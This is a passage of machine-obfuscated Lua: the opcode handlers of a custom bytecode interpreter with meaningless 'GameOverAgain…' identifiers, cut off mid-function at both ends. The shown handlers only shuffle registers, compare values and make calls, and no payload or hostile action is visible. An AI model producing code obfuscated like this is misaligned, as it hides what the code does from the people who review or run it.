function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIl1ill1IIIllI11III1I = GameOverAgainII1I1Iil11l1IiIIilI > 0 and GameOverAgainII1I1Iil11l1IiIIilI - 1 or GameOverAgainlIl1illIiliil1l1iii1l - GameOverAgainiI1ilii1ilIilIl1i11 for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainIliillIIiIilllIIIli, GameOverAgainIliillIIiIilllIIIli + GameOverAgainlIl1ill1IIIllI11III1I do if GameOverAgainI1lIiii11ll1i1IlI1l - GameOverAgainIliillIIiIilllIIIli <= GameOverAgainlIl1illIiliil1l1iii1l then GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainIlI1iliI1lilIiIl1i1[GameOverAgainiI1ilii1ilIilIl1i11 + (GameOverAgainI1lIiii11ll1i1IlI1l - GameOverAgainIliillIIiIilllIIIli)] else GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] = nil end end GameOverAgainIlilIill1Il1IliiI1i = GameOverAgainIliillIIiIilllIIIli + GameOverAgainlIl1ill1IIIllI11III1I end, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainII1I1Iil11l1IiIIilI ~= 0 if GameOverAgainIiliilIi1lIl11l1lil ~= 0 then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end end, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if GameOverAgainIiliilIi1lIl11l1lil == 179 then return GameOverAgainiIlliIliiIlllIi1Il1[19]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 235) % 256, [53199] = (GameOverAgainII1I1Iil11l1IiIIilI - 235) % 256, [49575] = 0 }) end if GameOverAgainIiliilIi1lIl11l1lil == 142 then return GameOverAgainiIlliIliiIlllIi1Il1[26]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 116) % 256, [53199] = (GameOverAgainII1I1Iil11l1IiIIilI - 116) % 256, [49575] = 0 }) end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = not GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if GameOverAgainIiliilIi1lIl11l1lil == 3 then return GameOverAgainiIlliIliiIlllIi1Il1[21]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 79) % 256, [53199] = (GameOverAgainII1I1Iil11l1IiIIilI - 79) % 256, [49575] = 0 }) end GameOverAgainIlilIiI1Ii11l1Il111[GameOverAgainII1I1Iil11l1IiIIilI] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] end, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainIliillIIiIilllIIIli, GameOverAgainII1I1Iil11l1IiIIilI do GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] = nil end end, function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIi1iI1i1lIl1Il1iII1, GameOverAgainIilIl111llIlliiII1l, GameOverAgainliliiIIiliII1i1I1iI if GameOverAgainII1I1Iil11l1IiIIilI ~= 1 then if GameOverAgainII1I1Iil11l1IiIIilI ~= 0 then GameOverAgainIilIl111llIlliiII1l = GameOverAgainIliillIIiIilllIIIli + GameOverAgainII1I1Iil11l1IiIIilI - 1 else GameOverAgainIilIl111llIlliiII1l = GameOverAgainIlilIill1Il1IliiI1i end GameOverAgainIilIl111llIlliiII1l, GameOverAgainIi1iI1i1lIl1Il1iII1 = GameOverAgainiil1lI111lI11i1lIii(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli](GameOverAgaini1I1II1il1l1iI1lli1(GameOverAgainIiiilIill1ilIl1ii1i, GameOverAgainIliillIIiIilllIIIli + 1, GameOverAgainIilIl111llIlliiII1l))) else GameOverAgainIilIl111llIlliiII1l, GameOverAgainIi1iI1i1lIl1Il1iII1 = GameOverAgainiil1lI111lI11i1lIii(GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli]()) end if GameOverAgainIiliilIi1lIl11l1lil ~= 1 then if GameOverAgainIiliilIi1lIl11l1lil ~= 0 then GameOverAgainIilIl111llIlliiII1l = GameOverAgainIliillIIiIilllIIIli + GameOverAgainIiliilIi1lIl11l1lil - 2 else GameOverAgainIilIl111llIlliiII1l = GameOverAgainIilIl111llIlliiII1l + GameOverAgainIliillIIiIilllIIIli end GameOverAgainliliiIIiliII1i1I1iI = 0 for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainIliillIIiIilllIIIli, GameOverAgainIilIl111llIlliiII1l do GameOverAgainliliiIIiliII1i1I1iI = GameOverAgainliliiIIiliII1i1I1iI + 1 GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainIi1iI1i1lIl1Il1iII1[GameOverAgainliliiIIiliII1i1I1iI] end end GameOverAgainIlilIill1Il1IliiI1i = GameOverAgainIilIl111llIlliiII1l - 1 end, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainiiIilIlIl1IIi1l1IlI if GameOverAgainlIllIll1lIIIil1lIIli1 == 100000 then GameOverAgainiiIilIlIl1IIi1l1IlI = GameOverAgainIiiilIill1ilIl1ii1i[251] else GameOverAgainiiIilIlIl1IIi1l1IlI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainlIllIll1lIIIil1lIIli1][GameOverAgainll1I11iiiiIIIi1llII] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainilIllIIIiilIll1Iii1[GameOverAgainiiIilIlIl1IIi1l1IlI] end, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end if GameOverAgainII1I1Iil11l1IiIIilI < GameOverAgainIiliilIi1lIl11l1lil ~= (GameOverAgainIliillIIiIilllIIIli ~= 0) then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end end, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] if GameOverAgainIiliilIi1lIl11l1lil == 248 then return GameOverAgainiIlliIliiIlllIi1Il1[9]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 209) % 256, [53199] = (GameOverAgainII1I1Iil11l1IiIIilI - 209) % 256, [49575] = 0 }) end if GameOverAgainIiliilIi1lIl11l1lil == 212 then return GameOverAgainiIlliIliiIlllIi1Il1[20]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 138) % 256, [53199] = (GameOverAgainII1I1Iil11l1IiIIilI - 138) % 256, [49575] = 0 }) end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainIlilIiI1Ii11l1Il111[GameOverAgainII1I1Iil11l1IiIIilI] end, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = #GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end, nil, nil, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if not not GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] == (GameOverAgainIiliilIi1lIl11l1lil == 0) then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 else GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end end, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainl1ilil1iI1lli11i1l1 = GameOverAgainIliillIIiIilllIIIli + 2 local GameOverAgainl1iii11Iill11l1IIIi = { GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli](GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 1], GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 2]) } for GameOverAgainI1lIiii11ll1i1IlI1l = 1, GameOverAgainIiliilIi1lIl11l1lil do GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainl1ilil1iI1lli11i1l1 + GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainl1iii11Iill11l1IIIi[GameOverAgainI1lIiii11ll1i1IlI1l] end if GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 3] ~= nil then GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 2] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 3] else GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end end, nil, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli + 1] = GameOverAgainII1I1Iil11l1IiIIilI GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = GameOverAgainII1I1Iil11l1IiIIilI[GameOverAgainIiliilIi1lIl11l1lil] end, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end if GameOverAgainII1I1Iil11l1IiIIilI <= GameOverAgainIiliilIi1lIl11l1lil ~= (GameOverAgainIliillIIiIilllIIIli ~= 0) then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end end, nil, nil, nil, nil, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] if GameOverAgainII1I1Iil11l1IiIIilI == 1 then return true end local GameOverAgainIilIl111llIlliiII1l = GameOverAgainIliillIIiIilllIIIli + GameOverAgainII1I1Iil11l1IiIIilI - 2 if GameOverAgainII1I1Iil11l1IiIIilI == 0 then GameOverAgainIilIl111llIlliiII1l = GameOverAgainIlilIill1Il1IliiI1i end return true, GameOverAgainIliillIIiIilllIIIli, GameOverAgainIilIl111llIlliiII1l end, nil, function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] if GameOverAgainIiliilIi1lIl11l1lil == 230 then return GameOverAgainiIlliIliiIlllIi1Il1[30]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 173) % 256, [90718] = (GameOverAgainII1I1Iil11l1IiIIilI - 173) % 256, [49575] = 0 }) end if GameOverAgainIiliilIi1lIl11l1lil == 189 then return GameOverAgainiIlliIliiIlllIi1Il1[13]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 40) % 256, [53199] = (GameOverAgainII1I1Iil11l1IiIIilI - 40) % 256, [49575] = 0 }) end GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] = -GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end, function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii, GameOverAgainlIlli11li11iIilIilII1) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if not not GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] == (GameOverAgainIiliilIi1lIl11l1lil == 0) then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end end, function(GameOverAgainlIlIlIli1i1IiI11il11l) local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] local GameOverAgainiiIilIlIl1IIi1l1IlI if GameOverAgainlIllIll1lIIIil1lIIli1 == 100000 then GameOverAgainiiIilIlIl1IIi1l1IlI = GameOverAgainIiiilIill1ilIl1ii1i[251] else GameOverAgainiiIilIlIl1IIi1l1IlI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainlIllIll1lIIIil1lIIli1][GameOverAgainll1I11iiiiIIIi1llII] end GameOverAgainilIllIIIiilIll1Iii1[GameOverAgainiiIilIlIl1IIi1l1IlI] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIliillIIiIilllIIIli] end } GameOverAgainl1l11l11Ili1i11iiII[31] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi, GameOverAgainl111I11Ii1lIi11Iiii) local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if GameOverAgainII1I1Iil11l1IiIIilI > 255 then GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainII1I1Iil11l1IiIIilI - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainII1I1Iil11l1IiIIilI] end if GameOverAgainIiliilIi1lIl11l1lil > 255 then GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIl1ll1llliIll11i1i1[GameOverAgainIiliilIi1lIl11l1lil - 256][GameOverAgainll1I11iiiiIIIi1llII] else GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainIiliilIi1lIl11l1lil] end if GameOverAgainII1I1Iil11l1IiIIilI == GameOverAgainIiliilIi1lIl11l1lil ~= (GameOverAgainIliillIIiIilllIIIli ~= 0) then GameOverAgainiIIl1iliI11i11IlIIi = GameOverAgainiIIl1iliI11i11IlIIi + 1 end end GameOverAgainl1l11l11Ili1i11iiII[26] = function(GameOverAgainlIlIlIli1i1IiI11il11l, GameOverAgainIIi1lllii1liiil1IIi) local GameOverAgainIliillIIiIilllIIIli = GameOverAgainlIlIlIli1i1IiI11il11l[71033] local GameOverAgainIil1l1iiil1IlilIIiI = GameOverAgainlIlIlIli1i1IiI11il11l[49575] - GameOverAgainlIiI11lI1lililil1l1 local GameOverAgainII1I1Iil11l1IiIIilI = GameOverAgainlIlIlIli1i1IiI11il11l[53199] local GameOverAgainlIllIll1lIIIil1lIIli1 = GameOverAgainlIlIlIli1i1IiI11il11l[49575] local GameOverAgainIiliilIi1lIl11l1lil = GameOverAgainlIlIlIli1i1IiI11il11l[90718] if GameOverAgainIiliilIi1lIl11l1lil == 105 then return GameOverAgainiIlliIliiIlllIi1Il1[24]({ [71033] = (GameOverAgainIliillIIiIilllIIIli - 205) % 256, [90718] = (GameOverAgainII1I1Iil11l1IiIIilI - 205) % 256, [49575] = 0 }) end for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainIliillIIiIilllIIIli, #GameOverAgainIiiilIill1ilIl1ii1i do local GameOverAgainIIllIiI1IIIl11iii1i = GameOverAgainl1lIi1II1iIii1IiIl1 for GameOverAgaini1iiilllIilIlIiiI1l, GameOverAgainlIliii1iiI1lll1ilI11l in next, GameOverAgainllIil1l11IIlI1lll1i, nil do for GameOverAgainiiIilIlIl1IIi1l1IlI, GameOverAgainIlIIliIi1Iil111I1II in next, GameOverAgainlIliii1iiI1lll1ilI11l, nil do if GameOverAgainIiiilIill1ilIl1ii1i == GameOverAgainIlIIliIi1Iil111I1II[1] and GameOverAgainIlIIliIi1Iil111I1II[2] == GameOverAgainI1lIiii11ll1i1IlI1l then if not GameOverAgainlliIIi1IiI1I1IllI1i[GameOverAgainIIllIiI1IIIl11iii1i] then GameOverAgainlliIIi1IiI1I1IllI1i[GameOverAgainIIllIiI1IIIl11iii1i] = GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] GameOverAgainl1lIi1II1iIii1IiIl1 = GameOverAgainl1lIi1II1iIii1IiIl1 + 1 end GameOverAgainlIliii1iiI1lll1ilI11l[GameOverAgainiiIilIlIl1IIi1l1IlI] = {GameOverAgainlliIIi1IiI1I1IllI1i, 